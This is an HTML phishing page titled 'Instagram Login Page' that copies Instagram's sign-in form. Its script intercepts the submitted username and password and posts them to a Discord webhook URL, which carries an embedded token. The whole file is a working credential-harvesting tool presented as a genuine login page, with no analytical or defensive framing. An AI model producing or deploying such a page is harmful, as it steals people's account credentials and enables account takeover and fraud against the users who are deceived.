<!DOCTYPE html>
<html>
<head>
  <title>Instagram Login Page</title>
  <style>
    /* Simple CSS styling to make it look like Instagram's login page */
    body {
      background-color: #f7f7f7;
    }
   .login-container {
      width: 300px;
      margin: 50px auto;
      padding: 20px;
      border: 1px solid #ddd;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
   .login-form {
      margin-top: 20px;
    }
    label {
      display: block;
      margin-bottom: 10px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      height: 40px;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button[type="submit"] {
      width: 100%;
      height: 40px;
      background-color: #4CAF50;
      color: #fff;
      padding: 10px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button[type="submit"]:hover {
      background-color: #3e8e41;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Instagram Login</h2>
    <form class="login-form" id="login-form">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username"><br><br>
      <label for="password">Password:</label>
      <input type="password" id="password" name="password"><br><br>
      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    // Get the form element
    const form = document.getElementById('login-form');

    // Add an event listener to the form submission
    form.addEventListener('submit', (e) => {
      // Prevent the default form submission
      e.preventDefault();

      // Get the username and password values
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // Send the data to your Discord server using a webhook
      fetch('https://discord.com/api/webhooks/1291874322100654144/tw4Yzdmca0eF4cW9pU8vFynhF0E2zc2CcJPNCjpDAeZFayzwj-o_u2EnScueM2_AGtRe', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          username,
          password
        })
      })
     .then((response) => response.json())
     .then((data) => console.log(data))
     .catch((error) => console.error(error));
    });
  </script>
</body>
</html>
